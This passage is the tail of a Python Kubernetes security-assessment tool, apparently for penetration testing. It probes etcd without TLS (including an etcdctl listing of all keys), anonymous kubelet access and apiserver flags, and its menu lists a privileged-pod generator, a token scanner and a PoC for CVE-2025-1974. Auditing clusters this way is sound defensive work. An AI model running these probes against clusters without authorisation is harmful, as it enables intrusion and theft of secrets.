            if 'login' in cp.stdout.lower() or '401' in cp.stdout or '403' in cp.stdout:
                logger.warning("Authentication required (401/403 or login prompt)")
            else:
                logger.success(f"No authentication (200 OK): {cp.stdout[:200]}...")
        else:
            logger.error(f"Failed to access: {cp.stderr}")

    logger.info("Note: If HTTPS, try https:// with -k for curl. This checks for auth on registries.")

def ns_bypass():
    """Kubernetes namespaces bypass check: list ns and try access pods in them."""
    logger.info("[8] Kubernetes namespaces bypass check")
    ns_list = kubectl_json("get namespaces")
    if not ns_list:
        logger.error("Could not list namespaces.")
        return

    ns_names = [n['metadata']['name'] for n in ns_list.get('items', [])]
    logger.info(f"Found namespaces: {len(ns_names)}")
    for name in ns_names:
        logger.info(f"Checking access to pods in namespace {name}...")
        cp = run(f"kubectl get pods -n {name}", capture=True)
        if cp.returncode == 0:
            logger.success("Accessible! Pods:")
            logger.info(cp.stdout)
        else:
            logger.warning("Not accessible (RBAC restriction?):")
            logger.info(cp.stderr)

    logger.info("This checks RBAC permissions for getting pods in each namespace.")
    logger.info("Note: Even if not accessible via RBAC, network bypass may allow direct IP access to services/pods.")

def core_components_check():
    """Check core components: apiserver flags, etcd no-TLS, kubelet anon access."""
    logger.info("[9] Core components check (apiserver, etcd, kubelet)")

    # Check kube-apiserver flags
    logger.info("Checking kube-apiserver flags (--anonymous-auth, --insecure-port)...")
    apiserver_pods = kubectl_json("get pods -n kube-system -l component=kube-apiserver")
    if not apiserver_pods:
        logger.error("Could not find kube-apiserver pods.")
    else:
        for p in apiserver_pods.get('items', []):
            name = p['metadata']['name']
            cp = run(f"kubectl exec -n kube-system {name} -- cat /proc/1/cmdline", capture=True)
            if cp.returncode == 0:
                cmdline = cp.stdout.strip().replace('\x00', ' ')
                anon_auth = '--anonymous-auth=true' in cmdline
                insecure_port = '--insecure-port=' in cmdline
                logger.info(f"Pod {name}:")
                if anon_auth:
                    logger.warning("--anonymous-auth=true (anonymous access enabled)")
                else:
                    logger.success("--anonymous-auth=false (ok)")
                if insecure_port:
                    logger.warning("--insecure-port enabled (insecure HTTP port)")
                else:
                    logger.success("--insecure-port not enabled (ok)")
            else:
                logger.error(f"Failed to get cmdline for {name}: {cp.stderr}")

    # Check etcd
    logger.info("Checking etcd access without TLS (port 2379)...")
    etcd_pods = kubectl_json("get pods -n kube-system -l component=etcd")
    if not etcd_pods:
        logger.error("Could not find etcd pods.")
    else:
        for p in etcd_pods.get('items', []):
            name = p['metadata']['name']
            node_name = p['spec']['nodeName']
            node = kubectl_json(f"get node {node_name}")
            if node:
                addrs = node.get('status', {}).get('addresses', [])
                ips = [a['address'] for a in addrs if a.get('type') == 'InternalIP']
                if ips:
                    etcd_ip = ips[0]
                    logger.info(f"Trying curl on etcd at {etcd_ip}:2379/version...")
                    cp = run(f"curl -m 5 http://{etcd_ip}:2379/version", capture=True)
                    if cp.returncode == 0:
                        logger.warning(f"Accessible without TLS: {cp.stdout}")
                    else:
                        logger.success("Not accessible without TLS (ok or requires TLS/auth)")
                    if which("etcdctl"):
                        logger.info("Checking etcd access with etcdctl (read all keys)...")
                        cp = run(f"etcdctl --endpoints=http://{etcd_ip}:2379 get / --prefix --keys-only", capture=True)
                        if cp.returncode == 0:
                            logger.warning(f"Accessible without auth/TLS: {cp.stdout[:200]}...")
                        else:
                            logger.success(f"Not accessible (ok): {cp.stderr}")
                    else:
                        logger.warning("etcdctl not found. Skip etcdctl check.")
                else:
                    logger.error(f"No InternalIP for node {node_name}")
            else:
                logger.error(f"Could not get node {node_name}")

    # Check kubelet
    logger.info("Checking kubelet anonymous access (port 10250)...")
    nodes = kubectl_json("get nodes")
    if not nodes:
        logger.error("Could not get nodes.")
    else:
        for n in nodes.get('items', []):
            name = n['metadata']['name']
            addrs = n.get('status', {}).get('addresses', [])
            ips = [a['address'] for a in addrs if a.get('type') == 'InternalIP']
            if ips:
                kubelet_ip = ips[0]
                logger.info(f"Trying anonymous access to kubelet at {kubelet_ip}:10250/pods...")
                cp = run(f"curl -k -m 5 https://{kubelet_ip}:10250/pods", capture=True)
                if cp.returncode == 0 and 'Unauthorized' not in cp.stdout:
                    logger.warning("Anonymous access allowed: Returns pods info")
                else:
                    logger.success("Anonymous access denied (ok)")
            else:
                logger.error(f"No InternalIP for node {name}")

    logger.info("Core components check complete. Review for vulnerabilities.")

def spawn_shell():
    """Spawn a shell and return to menu after exit."""
    logger.info("[10] Spawning shell. Type 'exit' to return to menu.")
    subprocess.run("/bin/bash", shell=True)
    logger.info("Returned to menu.")

# ---------------------
# Command registry
# ---------------------
COMMANDS = [
    ("pod2node", "Generate privileged pod YAML and inspect nodes/pods", pod2node_interactive),
    ("privscan", "Scan for privileged containers (enumeration only)", privileged_containers_scan),
    ("rbac", "RBAC token scanner - check SA tokens for dangerous perms", rbac_token_checker),
    ("ingress", "Check ingress controller images/versions and craft Ingress with PoC for CVE-2025-1974", ingress_checker),
    ("nodeport", "List NodePort services and node IP hints", nodeport_scanner),
    ("envinfo", "Gain environment information from a pod (env, hosts, etc.)", env_info),
    ("registryscan", "Search for registries in the cluster and suggest curling them", registry_scanner),
    ("nsbypass", "Kubernetes namespaces bypass check (list ns and try access pods)", ns_bypass),
    ("corecheck", "Check core components (apiserver flags, etcd no-TLS, kubelet anon access)", core_components_check),
    ("shell", "Spawn a shell and return to menu", spawn_shell),
]

def print_menu():
    logger.info("Available commands:")
    for i, (key, desc, _) in enumerate(COMMANDS, 1):
        logger.info(f"  {i}. {key:<10} - {desc}")
    logger.info("  q. quit")

def main():
    global BANNER_SHOWN
    check_prereqs()
    if not BANNER_SHOWN:
        logger.info(BANNER)
        BANNER_SHOWN = True
    
    while True:
        print_menu()
        choice = input('Select an option (number or command): ').strip()
        if not choice:
            continue
        if choice.lower() in ('q', 'quit', 'exit'):
            logger.info("bye")
            break
        func = None
        if choice.isdigit():
            idx = int(choice) - 1
            if 0 <= idx < len(COMMANDS):
                func = COMMANDS[idx][2]
        else:
            for key, _, f in COMMANDS:
                if choice == key:
                    func = f
                    break
        if func is None:
            logger.error("Invalid choice. Pick a number or command name.")
            continue
        try:
            func()
        except KeyboardInterrupt:
            logger.info("Interrupted, returning to menu.")
        except Exception as e:
            logger.error(f"Error in command: {e}")

if __name__ == '__main__':
    main()
